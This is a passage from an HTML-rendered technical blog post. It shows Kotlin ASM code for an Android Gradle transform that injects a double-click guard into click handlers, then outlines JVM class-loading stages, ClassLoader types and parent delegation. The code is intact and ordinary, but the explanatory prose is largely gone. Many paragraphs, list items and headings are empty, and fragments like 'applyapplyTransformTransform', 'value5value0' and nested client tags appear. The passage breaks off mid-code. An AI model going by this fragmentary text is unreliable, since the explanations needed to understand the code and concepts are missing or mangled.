punctuation\">)</span>\n        appExtension<span class=\"token punctuation\">.</span><span class=\"token function\">registerTransform</span><span class=\"token punctuation\">(</span><span class=\"token function\">DoubleClickTransform</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>applyapplyTransformTransform</p>\n<p>apply</p>\n<pre class=\"line-numbers language-groovy\" data-language=\"groovy\"><code class=\"language-groovy\"><span class=\"token keyword\">import</span> github<span class=\"token punctuation\">.</span>leavesczy<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>plugins<span class=\"token punctuation\">.</span>doubleClick<span class=\"token punctuation\">.</span>DoubleClickPlugin\n\napply plugin<span class=\"token punctuation\">:</span> DoubleClickPlugin<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h6 id=\"transform\"><a href=\"#transform\" class=\"headerlink\" title=\"transform\"></a>transform</h6><p><code>DoubleClickTransform</code></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> <span class=\"token function\">DoubleClickTransform</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">BaseTransform</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">companion</span> <span class=\"token keyword\">object</span> <span class=\"token punctuation\">{</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> ViewDescriptor <span class=\"token operator\">=</span> <span class=\"token string\">\"Landroid/view/View;\"</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> OnClickViewMethodDescriptor <span class=\"token operator\">=</span> <span class=\"token string\">\"(Landroid/view/View;)V\"</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> ButterKnifeOnClickAnnotationDesc <span class=\"token operator\">=</span> <span class=\"token string\">\"Lbutterknife/OnClick;\"</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> MethodNode<span class=\"token punctuation\">.</span>onlyOneViewParameter<span class=\"token operator\">:</span> Boolean\n            <span class=\"token keyword\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> desc <span class=\"token operator\">==</span> OnClickViewMethodDescriptor\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> MethodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasCheckViewAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">hasAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">.</span>formatCheckViewOnClickAnnotation<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> MethodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasUncheckViewOnClickAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">hasAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">.</span>formatUncheckViewOnClickAnnotation<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> MethodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasButterKnifeOnClickAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">hasAnnotation</span><span class=\"token punctuation\">(</span>ButterKnifeOnClickAnnotationDesc<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">modifyClass</span><span class=\"token punctuation\">(</span>byteArray<span class=\"token operator\">:</span> ByteArray<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> ByteArray <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">val</span> classReader <span class=\"token operator\">=</span> <span class=\"token function\">ClassReader</span><span class=\"token punctuation\">(</span>byteArray<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> classNode <span class=\"token operator\">=</span> <span class=\"token function\">ClassNode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>classNode<span class=\"token punctuation\">,</span> ClassReader<span class=\"token punctuation\">.</span>EXPAND_FRAMES<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> methods <span class=\"token operator\">=</span> classNode<span class=\"token punctuation\">.</span>methods\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>methods<span class=\"token punctuation\">.</span><span class=\"token function\">isNullOrEmpty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">val</span> shouldHookMethodList <span class=\"token operator\">=</span> mutableSetOf<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>methodNode <span class=\"token keyword\">in</span> methods<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token comment\">// UncheckViewOnClick </span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span>isStatic <span class=\"token operator\">||</span>\n                    methodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasUncheckViewOnClickAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">continue</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token keyword\">val</span> methodNameWithDesc <span class=\"token operator\">=</span> methodNode<span class=\"token punctuation\">.</span>nameWithDesc\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span>onlyOneViewParameter<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasCheckViewAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token comment\">// CheckViewOnClick </span>\n                        shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>methodNameWithDesc<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">continue</span>\n                    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasButterKnifeOnClickAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token comment\">// ButterKnife method  OnClick </span>\n                        shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>methodNameWithDesc<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">continue</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>classNode<span class=\"token punctuation\">.</span><span class=\"token function\">isHookPoint</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">,</span> methodNode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>methodNameWithDesc<span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">continue</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token comment\">// lambda </span>\n                <span class=\"token keyword\">val</span> invokeDynamicInsnNodes <span class=\"token operator\">=</span> methodNode<span class=\"token punctuation\">.</span><span class=\"token function\">findHookPointLambda</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">)</span>\n                invokeDynamicInsnNodes<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">val</span> handle <span class=\"token operator\">=</span> it<span class=\"token punctuation\">.</span>bsmArgs<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">as</span><span class=\"token operator\">?</span> Handle\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>handle <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>handle<span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> handle<span class=\"token punctuation\">.</span>desc<span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">isNotEmpty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>methodNode <span class=\"token keyword\">in</span> methods<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">val</span> methodNameWithDesc <span class=\"token operator\">=</span> methodNode<span class=\"token punctuation\">.</span>nameWithDesc\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">contains</span><span class=\"token punctuation\">(</span>methodNameWithDesc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token keyword\">val</span> argumentTypes <span class=\"token operator\">=</span> Type<span class=\"token punctuation\">.</span><span class=\"token function\">getArgumentTypes</span><span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span>desc<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">val</span> viewArgumentIndex <span class=\"token operator\">=</span> argumentTypes<span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">indexOfFirst</span> <span class=\"token punctuation\">{</span>\n                            it<span class=\"token punctuation\">.</span>descriptor <span class=\"token operator\">==</span> ViewDescriptor\n                        <span class=\"token punctuation\">}</span> <span class=\"token operator\">?:</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span>\n                        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>viewArgumentIndex <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                            <span class=\"token keyword\">val</span> instructions <span class=\"token operator\">=</span> methodNode<span class=\"token punctuation\">.</span>instructions\n                            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>instructions <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">&amp;&amp;</span> instructions<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                                <span class=\"token keyword\">val</span> list <span class=\"token operator\">=</span> <span class=\"token function\">InsnList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>\n                                    <span class=\"token function\">VarInsnNode</span><span class=\"token punctuation\">(</span>\n                                        Opcodes<span class=\"token punctuation\">.</span>ALOAD<span class=\"token punctuation\">,</span> <span class=\"token function\">getVisitPosition</span><span class=\"token punctuation\">(</span>\n                                            argumentTypes<span class=\"token punctuation\">,</span>\n                                            viewArgumentIndex<span class=\"token punctuation\">,</span>\n                                            methodNode<span class=\"token punctuation\">.</span>isStatic\n                                        <span class=\"token punctuation\">)</span>\n                                    <span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>\n                                    <span class=\"token function\">MethodInsnNode</span><span class=\"token punctuation\">(</span>\n                                        Opcodes<span class=\"token punctuation\">.</span>INVOKESTATIC<span class=\"token punctuation\">,</span>\n                                        config<span class=\"token punctuation\">.</span>formatDoubleCheckClass<span class=\"token punctuation\">,</span>\n                                        config<span class=\"token punctuation\">.</span>doubleCheckMethodName<span class=\"token punctuation\">,</span>\n                                        config<span class=\"token punctuation\">.</span>doubleCheckMethodDescriptor\n                                    <span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">)</span>\n                                <span class=\"token keyword\">val</span> labelNode <span class=\"token operator\">=</span> <span class=\"token function\">LabelNode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token function\">JumpInsnNode</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>IFNE<span class=\"token punctuation\">,</span> labelNode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token function\">InsnNode</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>RETURN<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>labelNode<span class=\"token punctuation\">)</span>\n                                instructions<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>list<span class=\"token punctuation\">)</span>\n                            <span class=\"token punctuation\">}</span>\n                        <span class=\"token punctuation\">}</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token keyword\">val</span> classWriter <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span>ClassWriter<span class=\"token punctuation\">.</span>COMPUTE_MAXS<span class=\"token punctuation\">)</span>\n                classNode<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>classWriter<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">return</span> classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> byteArray\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> ClassNode<span class=\"token punctuation\">.</span><span class=\"token function\">isHookPoint</span><span class=\"token punctuation\">(</span>config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">,</span> methodNode<span class=\"token operator\">:</span> MethodNode<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">val</span> myInterfaces <span class=\"token operator\">=</span> interfaces\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>myInterfaces<span class=\"token punctuation\">.</span><span class=\"token function\">isNullOrEmpty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">val</span> extraHookMethodList <span class=\"token operator\">=</span> config<span class=\"token punctuation\">.</span>hookPointList\n        extraHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>myInterfaces<span class=\"token punctuation\">.</span><span class=\"token function\">contains</span><span class=\"token punctuation\">(</span>it<span class=\"token punctuation\">.</span>interfaceName<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> methodNode<span class=\"token punctuation\">.</span>nameWithDesc <span class=\"token operator\">==</span> it<span class=\"token punctuation\">.</span>methodSign<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> MethodNode<span class=\"token punctuation\">.</span><span class=\"token function\">findHookPointLambda</span><span class=\"token punctuation\">(</span>config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>InvokeDynamicInsnNode<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">val</span> onClickListenerLambda <span class=\"token operator\">=</span> findLambda <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">val</span> nodeName <span class=\"token operator\">=</span> it<span class=\"token punctuation\">.</span>name\n            <span class=\"token keyword\">val</span> nodeDesc <span class=\"token operator\">=</span> it<span class=\"token punctuation\">.</span>desc\n            <span class=\"token keyword\">val</span> find <span class=\"token operator\">=</span> config<span class=\"token punctuation\">.</span>hookPointList<span class=\"token punctuation\">.</span><span class=\"token function\">find</span> <span class=\"token punctuation\">{</span> point <span class=\"token operator\">-&gt;</span>\n                nodeName <span class=\"token operator\">==</span> point<span class=\"token punctuation\">.</span>methodName <span class=\"token operator\">&amp;&amp;</span> nodeDesc<span class=\"token punctuation\">.</span><span class=\"token function\">endsWith</span><span class=\"token punctuation\">(</span>point<span class=\"token punctuation\">.</span>interfaceSignSuffix<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">return</span><span class=\"token label symbol\">@findLambda</span> find <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> onClickListenerLambda\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">getInputTypes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Set<span class=\"token operator\">&lt;</span>QualifiedContent<span class=\"token punctuation\">.</span>ContentType<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> TransformManager<span class=\"token punctuation\">.</span>CONTENT_CLASS\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">getScopes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> MutableSet<span class=\"token operator\">&lt;</span><span class=\"token keyword\">in</span> QualifiedContent<span class=\"token punctuation\">.</span>Scope<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">mutableSetOf</span><span class=\"token punctuation\">(</span>\n            QualifiedContent<span class=\"token punctuation\">.</span>Scope<span class=\"token punctuation\">.</span>PROJECT<span class=\"token punctuation\">,</span>\n            QualifiedContent<span class=\"token punctuation\">.</span>Scope<span class=\"token punctuation\">.</span>SUB_PROJECTS<span class=\"token punctuation\">,</span>\n<span class=\"token comment\">//            QualifiedContent.Scope.EXTERNAL_LIBRARIES</span>\n        <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>BaseTransform</code>class<code>modifierClass(byteArray: ByteArray): ByteArray</code>asm</p>\n<p></p>\n<ul>\n<li>hookButterKnifeonClickView#setOnClickListener</li>\n<li>hook</li>\n</ul>\n<blockquote>\n<p></p>\n</blockquote>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/13202633-3cb11d1712a9efc9.webp\" alt=\"13202633-3cb11d1712a9efc9\"></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h4 id=\"-Loading\"><a href=\"#-Loading\" class=\"headerlink\" title=\" Loading\"></a> Loading</h4><blockquote>\n<p>io</p>\n<p></p>\n<ol>\n<li></li>\n<li></li>\n<li>java.lang.Class</li>\n</ol>\n<p></p>\n</blockquote>\n<h4 id=\"-Verification\"><a href=\"#-Verification\" class=\"headerlink\" title=\" Verification\"></a> Verification</h4><blockquote>\n<p>Class</p>\n<ol>\n<li></li>\n<li><em><strong></strong></em></li>\n<li></li>\n<li></li>\n</ol>\n</blockquote>\n<h4 id=\"-Preparation\"><a href=\"#-Preparation\" class=\"headerlink\" title=\" Preparation\"></a> Preparation</h4><blockquote>\n<p></p>\n</blockquote>\n<p></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> value <span class=\"token operator\">=</span> <span class=\"token number\">12345</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>value5value0</p>\n<h4 id=\"-Resolution\"><a href=\"#-Resolution\" class=\"headerlink\" title=\" Resolution\"></a> Resolution</h4><blockquote>\n<p></p>\n<ul>\n<li>JavaClass</li>\n<li></li>\n</ul>\n<p></p>\n<ul>\n<li><p></p>\n</li>\n<li><p></p>\n</li>\n<li><p></p>\n</li>\n<li><p></p>\n</li>\n</ul>\n</blockquote>\n<h4 id=\"-Initialization\"><a href=\"#-Initialization\" class=\"headerlink\" title=\" Initialization\"></a> Initialization</h4><blockquote>\n<p><client><client><client><client><client>()</client></client></client></client></client></p>\n<p>java</p>\n<ul>\n<li><p>newfinal</p>\n</li>\n<li><p></p>\n</li>\n<li><p>java.lang.reflect</p>\n</li>\n<li><p>main</p>\n</li>\n<li><p>jdk 1.7java.lang.invoke.MethodHandle REF_getStaticREF_putStaticREF_invokeStatic</p>\n</li>\n</ul>\n</blockquote>\n<h4 id=\"-Unloading\"><a href=\"#-Unloading\" class=\"headerlink\" title=\" Unloading\"></a> Unloading</h4><blockquote>\n<p>ClassclassLoadergc rootsgc rootsgcjvm(JavaAgent</p>\n</blockquote>\n<h3 id=\"-ClassLoader\"><a href=\"#-ClassLoader\" class=\"headerlink\" title=\" (ClassLoader)\"></a> (ClassLoader)</h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>JVM  ClassLoader ClassLoader  jar </p>\n<p>JVM  ClassLoader BootstrapClassLoaderExtensionClassLoader  AppClassLoader</p>\n<p>BootstrapClassLoader  JVM  JAVA_HOME/lib/rt.jar  java.xxx.*  java.util.*java.io.*java.nio.<em>java.lang.</em>  ClassLoader  C </p>\n<p>ExtensionClassLoader  JVM  swing  js xml   javax  jar  JAVA_HOME/lib/ext/*.jar  jar </p>\n<p>AppClassLoader  Classpath  jar  jar </p>\n<p> jar  classjdk  URLClassLoader URLClassLoader URLClassLoader ExtensionClassLoader  AppClassLoader  URLClassLoader </p>\n<p>AppClassLoader  ClassLoader  getSystemClassLoader()  main  AppClassLoader</p>\n<h4 id=\"ClassLoader-\"><a href=\"#ClassLoader-\" class=\"headerlink\" title=\"ClassLoader \"></a>ClassLoader </h4><p> ClassLoader  Class  ClassLoader  Class  Class  Class  classLoader </p>\n<p> ClassLoader  main  ClassLoader  AppClassLoader</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<p><strong>Java</strong>java.lang.Objectrt.jarBootstrap ClassLoaderObjectjava.lang.ObjectClassPathObjectrt.jarJava</p>\n<p><img src=\"https://img-blog.csdn.net/20160506184936657\" alt=\"\"></p>\n<p><strong></strong></p>\n<p>java.lang.ClassLoaderloadClass()loadClass()ClassNotFoundExceptionfindClass()</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">protected</span> <span class=\"token keyword\">synchronized</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">&gt;</span></span> <span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span><span class=\"token keyword\">boolean</span> resolve<span class=\"token punctuation\">)</span><span class=\"token keyword\">throws</span> <span class=\"token class-name\">ClassNotFoundException</span><span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">//check the class has been loaded or not</span>\n    <span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> <span class=\"token function\">findLoadedClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>parent <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                c <span class=\"token operator\">=</span> parent<span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n                c <span class=\"token operator\">=</span> <span class=\"token function\">findBootstrapClassOrNull</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ClassNotFoundException</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">//if throws the exception ,the father can not complete the load</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token 